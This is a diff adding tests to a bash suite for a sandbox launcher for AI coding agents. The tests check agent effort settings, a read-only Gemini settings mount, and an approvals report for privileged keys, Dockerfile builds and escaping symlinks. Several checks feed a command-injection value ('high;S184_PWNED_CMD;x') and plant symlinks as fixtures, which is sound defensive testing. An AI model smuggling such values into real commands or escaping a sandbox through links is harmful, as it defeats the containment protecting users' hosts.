+    bash -c '[ "$1" = "ARGV: [--no-auto-update]" ]' _ "$_S184_NONE"
+# The sink is `bash -c`. Host-side validation rejects anything but the five
+# levels, but each builder must be safe on its own (R1): an unvalidated value
+# neither executes nor reaches grok as an invented level.
+_S184_GINJ="$(trap - ERR; _s184_run "$_S184_DIR/grok.sh" build_grok_cmd 'high;S184_PWNED_CMD;x')"
+check "§184(4) an injected SANDY_EFFORT neither executes nor reaches grok (got: $_S184_GINJ)" \
+    bash -c 'printf "%s\n" "$1" | grep -q "^ARGV:" && ! printf "%s\n" "$1" | grep -q "^S184_PWNED" && ! printf "%s\n" "$1" | grep -q effort' _ "$_S184_GINJ"
+# claude's --effort used to be interpolated unquoted; safe only because the value
+# was validated elsewhere. Quoting at the sink is the rule (R1), so the builder
+# is exercised with a value validation would have stopped: it must arrive as ONE
+# literal argument and nothing may run.
+_S184_CL="$(trap - ERR; _s184_run "$_S184_DIR/claude.sh" build_claude_cmd xhigh)"
+check "§184(5) claude still gets --effort <level> for a valid level (got: $_S184_CL)" \
+    bash -c 'printf "%s\n" "$1" | grep -q "^ARGV:" && printf "%s\n" "$1" | grep -qF "[--effort] [xhigh]"' _ "$_S184_CL"
+_S184_CINJ="$(trap - ERR; _s184_run "$_S184_DIR/claude.sh" build_claude_cmd 'high;S184_PWNED_CMD;x')"
+check "§184(6) an injected SANDY_EFFORT reaches claude as ONE literal --effort argument and executes nothing (got: $_S184_CINJ)" \
+    bash -c 'printf "%s\n" "$1" | grep -q "^ARGV:" && ! printf "%s\n" "$1" | grep -q "^S184_PWNED" && printf "%s\n" "$1" | grep -qF "[--effort] [high;S184_PWNED_CMD;x]"' _ "$_S184_CINJ"
+# ANTI-VACUITY: the same harness against the pre-2.7.0 unquoted line must SEE
+# the injection, or (6) proves nothing.
+sed 's/--effort $(printf "%q" "$SANDY_EFFORT")/--effort ${SANDY_EFFORT}/' "$_S184_DIR/claude.sh" > "$_S184_DIR/claude-unquoted.sh"
+_S184_CAN="$(trap - ERR; _s184_run "$_S184_DIR/claude-unquoted.sh" build_claude_cmd 'high;S184_PWNED_CMD;x')"
+check "§184(7) anti-vacuity: the harness sees the injection against the old unquoted --effort (got: $_S184_CAN)" \
+    bash -c '! cmp -s "$2" "$3" && printf "%s\n" "$1" | grep -q "^S184_PWNED"' _ "$_S184_CAN" "$_S184_DIR/claude.sh" "$_S184_DIR/claude-unquoted.sh"
+# Host-side: the validation block keeps the pinned value for a grok launch (so
+# the marker records it), names the max clamp once, and still clears it -- with
+# a message -- for a launch with none of the wired agents.
+_S184_VAL="$(awk '/^# Validate SANDY_EFFORT/{f=1} f{print} f&&/^fi$/{exit}' "$SANDY_SCRIPT")"
+_S184_HAS="$(grep -m1 '^_sandy_agent_has() {' "$SANDY_SCRIPT" || true)"
+_s184_val() { # _s184_val <agents> <effort> -> "rc=<n> effort=<v>" plus messages
+    bash -c 'error() { echo "ERR $*"; }; info() { echo "INFO $*"; }; eval "$3"; SANDY_AGENT="$1"; SANDY_EFFORT="$2"; ( eval "$4"; echo "rc=0 effort=$SANDY_EFFORT" ) || echo "rc=$?"' _ "$1" "$2" "$_S184_HAS" "$_S184_VAL" 2>&1
+}
+check "§184(8) the validation block and _sandy_agent_has were extracted (mutation: a rename empties them)" \
+    bash -c 'printf "%s" "$1" | grep -q "Invalid SANDY_EFFORT" && test -n "$2"' _ "$_S184_VAL" "$_S184_HAS"
+_S184_V="$(_s184_val grok max)"
+check "§184(9) a grok-only launch KEEPS SANDY_EFFORT=max (the marker records the sandy level) and names the clamp to xhigh once (got: $_S184_V)" \
+    bash -c 'printf "%s\n" "$1" | grep -qx "rc=0 effort=max" && [ "$(printf "%s\n" "$1" | grep -c "reaches grok as xhigh")" = 1 ]' _ "$_S184_V"
+_S184_V="$(_s184_val grok high)"
+check "§184(10) ...and says nothing about a clamp for a level grok accepts (got: $_S184_V)" \
+    bash -c 'printf "%s\n" "$1" | grep -qx "rc=0 effort=high" && ! printf "%s\n" "$1" | grep -q "^INFO"' _ "$_S184_V"
+_S184_V="$(_s184_val claude,codex max)"
+check "§184(11) no clamp notice when grok is not in the agent set (got: $_S184_V)" \
+    bash -c 'printf "%s\n" "$1" | grep -qx "rc=0 effort=max" && ! printf "%s\n" "$1" | grep -q "^INFO"' _ "$_S184_V"
+_S184_V="$(_s184_val claude,grok max)"
+check "§184(12) ...and the notice in a combo that includes grok (got: $_S184_V)" \
+    bash -c 'printf "%s\n" "$1" | grep -qx "rc=0 effort=max" && printf "%s\n" "$1" | grep -q "reaches grok as xhigh"' _ "$_S184_V"
+_S184_V="$(_s184_val grok extreme)"
+check "§184(13) a grok launch fails loud on an invalid level (got: $_S184_V)" \
+    bash -c 'printf "%s\n" "$1" | grep -q "ERR Invalid SANDY_EFFORT" && printf "%s\n" "$1" | grep -qx "rc=1"' _ "$_S184_V"
+_S184_V="$(_s184_val gemini xhigh)"
+check "§184(14a) a gemini-only launch KEEPS SANDY_EFFORT now (it used to be cleared; gemini gets it through its settings file below) (got: $_S184_V)" \
+    bash -c 'printf "%s\n" "$1" | grep -qx "rc=0 effort=xhigh" && ! printf "%s\n" "$1" | grep -q "^INFO"' _ "$_S184_V"
+_S184_V="$(_s184_val opencode high)"
+check "§184(14) an opencode-only launch still clears it and SAYS so (got: $_S184_V)" \
+    bash -c 'printf "%s\n" "$1" | grep -qx "rc=0 effort=" && printf "%s\n" "$1" | grep -q "INFO SANDY_EFFORT=high ignored"' _ "$_S184_V"
+# gemini (2.7.0): no flag -- the surface is a sandy-owned SYSTEM settings file
+# (GEMINI_CLI_SYSTEM_SETTINGS_PATH), generated host-side and mounted :ro. The
+# generation block is extracted and run against a scratch $SANDBOX_DIR, and the
+# checks read back what it wrote and what it added to RUN_FLAGS -- the file is
+# what gemini-cli will merge OVER user and workspace settings, so its exact
+# content is the property, not the presence of a printf.
+_S184_GBLK="$(awk '/^# SANDY_EFFORT -> gemini \(2\.7\.0/{f=1} f{print} f&&/^unset _sandy_gemini_settings_file/{exit}' "$SANDY_SCRIPT")"
+check "§184(15) the gemini settings block was extracted (mutation: a rename empties it and every gemini check below goes vacuous)" \
+    bash -c 'printf "%s" "$1" | grep -q GEMINI_CLI_SYSTEM_SETTINGS_PATH && printf "%s" "$1" | grep -q "^unset _sandy_gemini_settings_file"' _ "$_S184_GBLK"
+_s184_gem() { # _s184_gem <sandbox dir> <agents> <effort> -> one "FLAG <x>" line per RUN_FLAGS element, plus warnings
+    bash -c 'warn() { echo "WARN $*"; }; eval "$3"; SANDBOX_DIR="$1"; SANDY_AGENT="$2"; SANDY_EFFORT="$4"; RUN_FLAGS=(); set -u; eval "$5"; for _f in ${RUN_FLAGS[@]+"${RUN_FLAGS[@]}"}; do echo "FLAG $_f"; done' \
+        _ "$1" "$2" "$_S184_HAS" "$3" "$_S184_GBLK" 2>&1
+}
+# The whole document, compared as parsed JSON: exactly one key, the two
+# overrides, nothing else -- a system file wins wholesale over the user and
+# workspace layers, so anything extra here would be imposed on the user too.
+_s184_doc() { # _s184_doc <file> <level> <budget> -> exit 0 iff the file is exactly the expected document
+    python3 - "$1" "$2" "$3" <<'PY'
+import json, sys
+f, lvl, bud = sys.argv[1], sys.argv[2], int(sys.argv[3])
+want = {"modelConfigs": {"customOverrides": [
+    {"match": {"model": "chat-base-3"}, "modelConfig": {"generateContentConfig": {"thinkingConfig": {"thinkingLevel": lvl}}}},
+    {"match": {"model": "chat-base-2.5"}, "modelConfig": {"generateContentConfig": {"thinkingConfig": {"thinkingBudget": bud}}}},
+]}}
+got = json.load(open(f))
+sys.exit(0 if got == want else 1)
+PY
+}
+if ! command -v python3 >/dev/null 2>&1; then
+    skip "§184(16-22) need python3 to read the generated gemini settings back"
+else
+for _s184_l in low:LOW:1024 medium:HIGH:8192 high:HIGH:24576 xhigh:HIGH:24576 max:HIGH:24576; do
+    _s184_e="${_s184_l%%:*}"; _s184_r="${_s184_l#*:}"
+    _S184_SB="$(cd "$(mktemp -d)" && pwd -P)"
+    _S184_V="$(_s184_gem "$_S184_SB" gemini "$_s184_e")"
+    check "§184(16:$_s184_e) SANDY_EFFORT=$_s184_e -> gemini system settings thinkingLevel ${_s184_r%%:*} (Gemini 3) and thinkingBudget ${_s184_r#*:} (2.5), and NOTHING else in the file" \
+        _s184_doc "$_S184_SB/gemini-system-settings.json" "${_s184_r%%:*}" "${_s184_r#*:}"
+    rm -rf "$_S184_SB"
+done
+_S184_SB="$(cd "$(mktemp -d)" && pwd -P)"
+_S184_V="$(_s184_gem "$_S184_SB" gemini high)"
+check "§184(17) the file is mounted READ-ONLY and GEMINI_CLI_SYSTEM_SETTINGS_PATH names exactly the mount destination (got: $_S184_V)" \
+    bash -c '[ "$(printf "%s\n" "$1" | grep -c "^FLAG ")" = 4 ] && printf "%s\n" "$1" | grep -qx "FLAG $2/gemini-system-settings.json:/etc/sandy-gemini/effort.json:ro" && printf "%s\n" "$1" | grep -qx "FLAG GEMINI_CLI_SYSTEM_SETTINGS_PATH=/etc/sandy-gemini/effort.json"' _ "$_S184_V" "$_S184_SB"
+# Not agent-writable: the source sits at the sandbox TOP LEVEL, which is never
+# mounted whole -- unlike $SANDBOX_DIR/gemini, the container's rw ~/.gemini,
+# where an agent could rewrite its own pin for the next launch.
+check "§184(18) the source is at the sandbox top level, NOT under the agent-writable gemini/ (~/.gemini), and sandy never mounts the sandbox dir itself" \
+    bash -c 'src="$(printf "%s\n" "$1" | sed -n "s/^FLAG \(.*\):\/etc\/sandy-gemini\/effort.json:ro$/\1/p")"; [ -n "$src" ] || exit 1; [ "${src%/*}" = "$2" ] || exit 1; case "$src" in "$2"/gemini/*) exit 1 ;; esac; ! grep -qE -- "-v \"?\\\$SANDBOX_DIR\"?:" "$3"' _ "$_S184_V" "$_S184_SB" "$SANDY_SCRIPT"
+# Only when it applies: effort set AND gemini selected. And a stale pin from
+# an earlier launch does not survive one where it does not apply.
+_S184_V="$(_s184_gem "$_S184_SB" gemini "")"
+check "§184(19) gemini selected but no SANDY_EFFORT -> no file, no mount, no env, and the previous launch's file is removed (got: $_S184_V)" \
+    bash -c '[ ! -e "$2/gemini-system-settings.json" ] && ! printf "%s\n" "$1" | grep -q "^FLAG"' _ "$_S184_V" "$_S184_SB"
+_S184_V="$(_s184_gem "$_S184_SB" claude,codex max)"
+check "§184(20) SANDY_EFFORT set but gemini not selected -> no file, no mount, no env (got: $_S184_V)" \
+    bash -c '[ ! -e "$2/gemini-system-settings.json" ] && ! printf "%s\n" "$1" | grep -q "^FLAG"' _ "$_S184_V" "$_S184_SB"
+_S184_V="$(_s184_gem "$_S184_SB" claude,gemini low)"
+check "§184(21) a combo that includes gemini gets it (got: $_S184_V)" \
+    bash -c 'printf "%s\n" "$1" | grep -qx "FLAG GEMINI_CLI_SYSTEM_SETTINGS_PATH=/etc/sandy-gemini/effort.json"' _ "$_S184_V"
+# §169's discipline: a link planted at the path is never written through.
+printf 'HOST-FILE-UNTOUCHED\n' > "$_S184_DIR/victim"
+rm -f "$_S184_SB/gemini-system-settings.json"
+ln -s "$_S184_DIR/victim" "$_S184_SB/gemini-system-settings.json"
+_S184_V="$(_s184_gem "$_S184_SB" gemini high)"
+check "§184(22) a symlink at the path is removed and named, its target is untouched, and a regular file replaces it (got: $_S184_V)" \
+    bash -c '[ "$(cat "$2/victim")" = HOST-FILE-UNTOUCHED ] && [ ! -L "$3/gemini-system-settings.json" ] && [ -f "$3/gemini-system-settings.json" ] && printf "%s\n" "$1" | grep -q "^WARN Removed a symlink"' _ "$_S184_V" "$_S184_DIR" "$_S184_SB"
+rm -rf "$_S184_SB"
+fi
+rm -rf "$_S184_DIR"
+unset _S184_DIR _S184_OUT _S184_MAX _S184_NONE _S184_GINJ _S184_CL _S184_CINJ _S184_CAN _S184_VAL _S184_HAS _S184_V _S184_GBLK _S184_SB _s184_a _s184_l _s184_e _s184_r
+unset -f _s184_run _s184_val _s184_gem _s184_doc
+
+# ============================================================
+echo "§183: sandy --approvals reports what each approval gate would refuse, and grants nothing (#296)"
+# ============================================================
+# WHY. A client with no terminal (CI, cron, a pty-less UI) gets a silently
+# weaker session: privileged workspace keys dropped, the project Dockerfile not
+# built, `--start` still exiting 0. `--approvals` shows that before launching.
+# Read-only by decision: there is no grant path, so the properties pinned here
+# are (a) the report is the LAUNCH's verdict -- the combined config+.secrets
+# set, minus keys the environment sets, hashed exactly as the writer hashes it
+# -- and (b) nothing is ever written, not even by the symlink gate's per-launch
+# list refresh.
+#
+# Approvals for the "approved" fixture are granted by the REAL `--start`
+# pre-pass (SANDY_APPROVE_ONLY=1), answered `y` on a pty, so the report is held
+# to the writer's actual hashes rather than to its own. Docker and curl are
+# logging stubs: the report must call neither.
+_S183_D="$(cd "$(mktemp -d)" && pwd -P)"
+_S183_SECRET="s183-SECRET-VALUE-do-not-print"
+mkdir -p "$_S183_D/stub" "$_S183_D/uh"
+printf '#!/bin/sh\necho "$*" >> "%s/docker.log"\nexit 0\n' "$_S183_D" > "$_S183_D/stub/docker"
+printf '#!/bin/sh\necho "$*" >> "%s/curl.log"\nexit 1\n' "$_S183_D" > "$_S183_D/stub/curl"
+chmod +x "$_S183_D/stub/docker" "$_S183_D/stub/curl"
+: > "$_S183_D/uh/target.txt"
+cat > "$_S183_D/q.py" <<'PY'
+import json, sys
+try:
+    d = json.load(open(sys.argv[1]))
+    print(json.dumps(eval(sys.argv[2]), sort_keys=True))
+except Exception:
+    print("PARSE-FAIL")
+PY
+cat > "$_S183_D/ptyyes.py" <<'PY'
+import os, pty, sys, select, time, signal
+res = sys.argv[1]
+pid, fd = pty.fork()
+if pid == 0:
+    try:
+        os.execvp(sys.argv[2], sys.argv[2:])
+    finally:
+        os._exit(127)
+buf = b''
+answered = 0
+deadline = time.time() + 120
+while time.time() < deadline:
+    r, _, _ = select.select([fd], [], [], 0.5)
+    if fd in r:
+        try:
+            d = os.read(fd, 4096)
+        except OSError:
+            break
+        if not d:
+            break
+        buf += d
+        while buf.count(b'[y/N]') > answered:
+            os.write(fd, b'y\n')
+            answered += 1
+else:
+    os.kill(pid, signal.SIGKILL)
+_, st = os.waitpid(pid, 0)
+rc = os.WEXITSTATUS(st) if os.WIFEXITED(st) else 255
+open(res, 'w').write('%d %d\n' % (answered, rc))
+PY
+# _s183_ws <dir>: a workspace asking for all three gates. The privileged keys
+# are SPLIT across config and .secrets (the launch hashes the combined set);
+# SANDY_MODEL is passive-safe and must not be reported.
+_s183_ws() {
+    mkdir -p "$1/.sandy"
+    printf 'SANDY_SSH=agent\nSANDY_MODEL=s183-model\n' > "$1/.sandy/config"
+    printf 'ANTHROPIC_API_KEY=%s\n' "$_S183_SECRET" > "$1/.sandy/.secrets"
+    printf 'ARG BASE_IMAGE\nFROM $BASE_IMAGE\nCOPY helper.sh /h.sh\n' > "$1/.sandy/Dockerfile"
+    echo 'echo one' > "$1/.sandy/helper.sh"
+    ln -s "$_S183_D/uh/target.txt" "$1/escape"
+}
+# _s183_env: the environment every run gets -- the suite's global
+# SANDY_AUTO_APPROVE_PRIVILEGED=1 pinned off, and the two keys the fixture
+# sets cleared, so only the files decide (empty counts as unset for sandy).
+_s183_run() { # <label> <home> <ws> [VAR=value...]
+    local _l="$1" _h="$2" _w="$3"; shift 3
+    : > "$_S183_D/docker.log"; : > "$_S183_D/curl.log"
+    _S183_RC=0
+    env HOME="$_S183_D/uh" SANDY_HOME="$_h" PATH="$_S183_D/stub:$PATH" \
+        SANDY_AUTO_APPROVE_PRIVILEGED=0 ANTHROPIC_API_KEY= SANDY_SSH= "$@" \
+        "$SANDY_SCRIPT" --approvals --workspace "$_w" \
+        > "$_S183_D/$_l.out" 2> "$_S183_D/$_l.err" || _S183_RC=$?
+    echo "$_S183_RC" > "$_S183_D/$_l.rc"
+    cat "$_S183_D/docker.log" "$_S183_D/curl.log" > "$_S183_D/$_l.calls" 2>/dev/null || true
+    return 0
+}
+_s183_q() { python3 "$_S183_D/q.py" "$_S183_D/$1.out" "$2" 2>/dev/null || echo PARSE-FAIL; }
+_s183_status() { _s183_q "$1" '{g["gate"]: g["status"] for g in d["gates"]}'; }
+_s183_tree() { find "$1" 2>/dev/null | LC_ALL=C sort; }
+
+_S183_H="$_S183_D/home"; _S183_W="$_S183_D/ws"
+mkdir -p "$_S183_H"; _s183_ws "$_S183_W"
+# Every sandy invocation, introspection included, creates the two empty
+# bind-mount fixtures at the top of SANDY_HOME; take the baseline after one.
+SANDY_HOME="$_S183_H" "$SANDY_SCRIPT" --print-version >/dev/null 2>&1 || true
+_S183_TREE0="$(_s183_tree "$_S183_H")"
+
+# --- pending: nothing approved yet --------------------------------------------
+_s183_run p "$_S183_H" "$_S183_W"
+check "§183(1) nothing approved: every gate reports pending, exit 2, complete, all three unresolved (got: $(_s183_status p), rc $(cat "$_S183_D/p.rc"))" \
+    bash -c '[ "$1" = "{\"dockerfile\": \"pending\", \"passive_privileged\": \"pending\", \"symlinks\": \"pending\"}" ] && [ "$2" = 2 ] && [ "$3" = true ] && [ "$4" = "[\"passive_privileged\", \"symlinks\", \"dockerfile\"]" ]' \
+    _ "$(_s183_status p)" "$(cat "$_S183_D/p.rc")" "$(_s183_q p 'd["complete"]')" "$(_s183_q p 'd["unresolved"]')"
+check "§183(2) stream contract: stdout is exactly one JSON document carrying schema_version, stderr is 0 bytes" \
+    bash -c '[ "$1" = 4 ] && [ ! -s "$2" ]' _ "$(_s183_q p 'd["schema_version"]')" "$_S183_D/p.err"
+check "§183(3) the privileged keys are reported by NAME from BOTH files (the combined set a launch hashes); the passive-safe SANDY_MODEL is not (got: $(_s183_q p '[g for g in d["gates"] if g["gate"]=="passive_privileged"][0]["keys"]'))" \
+    bash -c '[ "$1" = "[\"ANTHROPIC_API_KEY\", \"SANDY_SSH\"]" ] && [ "$2" = "[\".sandy/.secrets\", \".sandy/config\"]" ]' \
+    _ "$(_s183_q p '[g for g in d["gates"] if g["gate"]=="passive_privileged"][0]["keys"]')" \
+      "$(_s183_q p '[g for g in d["gates"] if g["gate"]=="passive_privileged"][0]["sources"]')"
+check "§183(4) no key VALUE reaches the output (the secret, the model string)" \
+    bash -c '! grep -qF -e "$1" -e s183-model "$2" "$3"' _ "$_S183_SECRET" "$_S183_D/p.out" "$_S183_D/p.err"
+check "§183(5) the Dockerfile gate names the context the approval would cover, and the symlink gate the escape" \
+    bash -c '[ "$1" = "[\"Dockerfile\", \"helper.sh\"]" ] && [ "$2" = "[\"escape -> $3\"]" ]' \
+    _ "$(_s183_q p '[g for g in d["gates"] if g["gate"]=="dockerfile"][0]["context_files"]')" \
+      "$(_s183_q p '[g for g in d["gates"] if g["gate"]=="symlinks"][0]["symlinks"]')" "$_S183_D/uh/target.txt"
+check "§183(6) nothing written: SANDY_HOME is byte-for-byte the tree it was (no approvals/, no sandbox dir, no build files)" \
+    test "$(_s183_tree "$_S183_H")" = "$_S183_TREE0"
+check "§183(7) no Docker and no network: the docker and curl stubs were never invoked" \
+    test ! -s "$_S183_D/p.calls"
+
+# A key the ENVIRONMENT sets is not part of the set a launch asks about --
+# the half --validate-config (one file at a time) cannot reproduce.
+_s183_run e "$_S183_H" "$_S183_W" ANTHROPIC_API_KEY=s183-from-env
+check "§183(8) a key already set in the environment drops out of the reported set and its hash (got: $(_s183_q e '[g for g in d["gates"] if g["gate"]=="passive_privileged"][0]["keys"]'))" \
+    bash -c '[ "$1" = "[\"SANDY_SSH\"]" ] && [ "$2" = "[\".sandy/config\"]" ] && [ "$3" != "$4" ] && ! grep -qF s183-from-env "$5"' \
+    _ "$(_s183_q e '[g for g in d["gates"] if g["gate"]=="passive_privileged"][0]["keys"]')" \
+      "$(_s183_q e '[g for g in d["gates"] if g["gate"]=="passive_privileged"][0]["sources"]')" \
+      "$(_s183_q e '[g for g in d["gates"] if g["gate"]=="passive_privileged"][0]["hash"]')" \
+      "$(_s183_q p '[g for g in d["gates"] if g["gate"]=="passive_privileged"][0]["hash"]')" "$_S183_D/e.out"
+
+# #295's session-created record is part of the Dockerfile gate's state: the
+# report must SAY it (the next approval prompt leads with it) and must not
+# clear it -- reading is not reviewing.
+_S183_SREC="$_S183_H/approvals/dockerfile-$(printf '%s' "$_S183_W" | { shasum -a 256 2>/dev/null || sha256sum; } | awk '{print $1}' | cut -c1-16).session-created"
+check "§183(8b) no session record: the dockerfile gate reports session_created false" \
+    test "$(_s183_q p '[g for g in d["gates"] if g["gate"]=="dockerfile"][0]["session_created"]')" = false
+mkdir -p "$_S183_H/approvals"; printf 'deadbeef\n# recorded:  2026-09-29T00:00:00Z\n# by:        session-end\n' > "$_S183_SREC"
+_s183_run sc "$_S183_H" "$_S183_W"
+check "§183(8c) a session-created record is reported as session_created true, and the report leaves it in place (mutation: a report that consults the record but clears it)" \
+    bash -c '[ "$1" = true ] && [ -f "$2" ]' _ "$(_s183_q sc '[g for g in d["gates"] if g["gate"]=="dockerfile"][0]["session_created"]')" "$_S183_SREC"
+rm -f "$_S183_SREC"; rmdir "$_S183_H/approvals" 2>/dev/null || true
+
+# SANDY_AUTO_APPROVE_PRIVILEGED covers two gates, never the symlink one.
+_s183_run a "$_S183_H" "$_S183_W" SANDY_AUTO_APPROVE_PRIVILEGED=1
+check "§183(9) under SANDY_AUTO_APPROVE_PRIVILEGED=1 the key and Dockerfile gates read approved (by auto_approve), the symlink gate stays pending" \
+    bash -c '[ "$1" = "{\"dockerfile\": \"approved\", \"passive_privileged\": \"approved\", \"symlinks\": \"pending\"}" ] && [ "$2" = "[\"auto_approve\", null, \"auto_approve\"]" ] && [ "$3" = 2 ]' \
+    _ "$(_s183_status a)" "$(_s183_q a '[g["approved_by"] for g in d["gates"]]')" "$(cat "$_S183_D/a.rc")"
+
+# The report mode must hold even WITH a terminal: run the report child itself
+# on a pty that answers y to anything. A report that fell through to a prompt
+# would be answered and would write the approval.
+if command -v python3 >/dev/null 2>&1; then
+    ( cd "$_S183_W" && env HOME="$_S183_D/uh" SANDY_HOME="$_S183_H" PATH="$_S183_D/stub:$PATH" \
+        SANDY_AUTO_APPROVE_PRIVILEGED=0 ANTHROPIC_API_KEY= SANDY_SSH= \
+        SANDY_APPROVE_ONLY=1 SANDY_APPROVE_REPORT="$_S183_D/tty.rep" \
+        python3 "$_S183_D/ptyyes.py" "$_S183_D/tty.res" "$SANDY_SCRIPT" ) >/dev/null 2>&1 || true
+fi
+check "§183(10) on a TTY that answers y, report mode still asks nothing and writes nothing (mutation: a report branch that falls through to the prompt or writer)" \
+    bash -c '[ "$(cat "$1" 2>/dev/null)" = "0 0" ] && grep -q "^done" "$2" && [ "$3" = "$4" ]' \
+    _ "$_S183_D/tty.res" "$_S183_D/tty.rep" "$(_s183_tree "$_S183_H")" "$_S183_TREE0"
+
+# --- approved: granted by the REAL pre-pass, answered y on a pty --------------
+if command -v python3 >/dev/null 2>&1; then
+    ( cd "$_S183_W" && env HOME="$_S183_D/uh" SANDY_HOME="$_S183_H" PATH="$_S183_D/stub:$PATH" \
+        SANDY_AUTO_APPROVE_PRIVILEGED=0 ANTHROPIC_API_KEY= SANDY_SSH= SANDY_APPROVE_ONLY=1 \
+        python3 "$_S183_D/ptyyes.py" "$_S183_D/grant.res" "$SANDY_SCRIPT" ) >/dev/null 2>&1 || true
+fi
+_S183_H16="$(printf '%s' "$_S183_W" | { shasum -a 256 2>/dev/null || sha256sum; } | awk '{print $1}' | cut -c1-16)"
+_S183_SLIST="$_S183_H/sandboxes/ws-$(printf '%s' "$_S183_H16" | cut -c1-8)/.sandy-approved-symlinks.list"
+check "§183(pre) the real pre-pass answered three prompts and wrote all three approvals" \
+    bash -c '[ "$(cat "$1" 2>/dev/null)" = "3 0" ] && [ -f "$2/approvals/passive-$3.list" ] && [ -f "$2/approvals/dockerfile-$3.list" ] && [ -f "$4" ]' \
+    _ "$_S183_D/grant.res" "$_S183_H" "$_S183_H16" "$_S183_SLIST"
+# A stale entry the launch's list refresh would prune -- so a report that
+# reached the refresh changes the file, and (13) sees it.
+if [ -f "$_S183_SLIST" ]; then printf 'gone -> /nowhere\n' >> "$_S183_SLIST"; fi
+_S183_TREE1="$(_s183_tree "$_S183_H")"
+_S183_SLIST_SUM="$(cksum < "$_S183_SLIST" 2>/dev/null || echo none)"
+_s183_run g "$_S183_H" "$_S183_W"
+check "§183(11) after the real grant: every gate approved (by approval_file), exit 0, nothing unresolved (got: $(_s183_status g), rc $(cat "$_S183_D/g.rc"))" \
+    bash -c '[ "$1" = "{\"dockerfile\": \"approved\", \"passive_privileged\": \"approved\", \"symlinks\": \"approved\"}" ] && [ "$2" = 0 ] && [ "$3" = "[]" ] && [ "$4" = "[\"approval_file\", \"approval_file\", \"approval_file\"]" ]' \
+    _ "$(_s183_status g)" "$(cat "$_S183_D/g.rc")" "$(_s183_q g 'd["unresolved"]')" "$(_s183_q g '[g["approved_by"] for g in d["gates"]]')"
+check "§183(12) the reported hashes ARE the ones the real writer stored (first line of each approval file), and approved_at is its UTC stamp" \
+    bash -c '[ "$1" = "$(head -n1 "$3/approvals/passive-$5.list")" ] && [ "$2" = "$(head -n1 "$3/approvals/dockerfile-$5.list")" ] && printf "%s" "$4" | grep -Eq "^\"[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}:[0-9]{2}Z\"$"' \
+    _ "$(_s183_q g '[g for g in d["gates"] if g["gate"]=="passive_privileged"][0]["hash"]' | tr -d '"')" \
+      "$(_s183_q g '[g for g in d["gates"] if g["gate"]=="dockerfile"][0]["hash"]' | tr -d '"')" \
+      "$_S183_H" "$(_s183_q g '[g for g in d["gates"] if g["gate"]=="dockerfile"][0]["approved_at"]')" "$_S183_H16"
+check "§183(13) an approved report writes nothing either -- not even the symlink list refresh every approved LAUNCH performs (the stale entry survives)" \
+    bash -c '[ "$1" = "$2" ] && [ "$3" = "$4" ] && grep -qxF "gone -> /nowhere" "$5"' \
+    _ "$(_s183_tree "$_S183_H")" "$_S183_TREE1" "$(cksum < "$_S183_SLIST" 2>/dev/null || echo none)" "$_S183_SLIST_SUM" "$_S183_SLIST"
+
+# --- changed / refused: edits after approval ----------------------------------
+printf 'ANTHROPIC_API_KEY=%s-rotated\n' "$_S183_SECRET" > "$_S183_W/.sandy/.secrets"
+echo 'echo two' > "$_S183_W/.sandy/helper.sh"
+ln -s "$_S183_D/uh/target.txt" "$_S183_W/escape2"
+_s183_run c "$_S183_H" "$_S183_W"
+check "§183(14) a changed VALUE (same key names) and a changed context helper read changed; a new escape reads refused; exit 2 (got: $(_s183_status c))" \
+    bash -c '[ "$1" = "{\"dockerfile\": \"changed\", \"passive_privileged\": \"changed\", \"symlinks\": \"refused\"}" ] && [ "$2" = 2 ] && [ "$3" = "[\"escape2 -> $4\"]" ]' \
+    _ "$(_s183_status c)" "$(cat "$_S183_D/c.rc")" "$(_s183_q c '[g for g in d["gates"] if g["gate"]=="symlinks"][0]["new"]')" "$_S183_D/uh/target.txt"
+check "§183(15) ...still naming no value, still writing nothing, still 0 bytes of stderr" \
+    bash -c '! grep -qF "$1" "$2" && [ ! -s "$3" ] && [ "$4" = "$5" ]' \
+    _ "$_S183_SECRET" "$_S183_D/c.out" "$_S183_D/c.err" "$(_s183_tree "$_S183_H")" "$_S183_TREE1"
+
+# --- not applicable, and the no-report cases -----------------------------------
+mkdir -p "$_S183_D/plain"
+_s183_run n "$_S183_H" "$_S183_D/plain"
+check "§183(16) a workspace asking for nothing: every gate not_applicable, exit 0" \
+    bash -c '[ "$1" = "{\"dockerfile\": \"not_applicable\", \"passive_privileged\": \"not_applicable\", \"symlinks\": \"not_applicable\"}" ] && [ "$2" = 0 ]' \
+    _ "$(_s183_status n)" "$(cat "$_S183_D/n.rc")"
+_s183_run x "$_S183_H" "$_S183_D/does-not-exist"
+check "§183(17) a missing workspace: one JSON document (complete false, an error), exit 1, 0 bytes of stderr" \
+    bash -c '[ "$1" = false ] && [ "$2" = true ] && [ "$3" = 1 ] && [ ! -s "$4" ]' \
+    _ "$(_s183_q x 'd["complete"]')" "$(_s183_q x 'isinstance(d["error"], str)')" "$(cat "$_S183_D/x.rc")" "$_S183_D/x.err"
+mkdir -p "$_S183_D/relay/.sandy"
+printf 'SANDY_RELAY=1\n' > "$_S183_D/relay/.sandy/config"
+_s183_run r "$_S183_H" "$_S183_D/relay"
+check "§183(18) a launch path that refuses before the gates (SANDY_RELAY hard error) is complete:false, exit 1 -- never a partial report read as clean" \
+    bash -c '[ "$1" = false ] && [ "$2" = 1 ] && [ ! -s "$3" ]' \
+    _ "$(_s183_q r 'd["complete"]')" "$(cat "$_S183_D/r.rc")" "$_S183_D/r.err"
+_S183_RC=0
+env SANDY_HOME="$_S183_H" "$SANDY_SCRIPT" --approvals --bogus > "$_S183_D/u.out" 2> "$_S183_D/u.err" || _S183_RC=$?
+check "§183(19) an unknown argument: one JSON document naming it, exit 1, 0 bytes of stderr" \
+    bash -c '[ "$1" = 1 ] && [ ! -s "$2" ] && grep -q -- "--bogus" "$3"' _ "$_S183_RC" "$_S183_D/u.err" "$_S183_D/u.out"
+
+rm -rf "$_S183_D"
+unset _S183_D _S183_SECRET _S183_H _S183_W _S183_TREE0 _S183_TREE1 _S183_H16 _S183_SLIST _S183_SLIST_SUM _S183_RC
+unset -f _s183_ws _s183_run _s183_q _s183_status _s183_tree 2>/dev/null || true
 
 
 # BEGIN SUMMARY
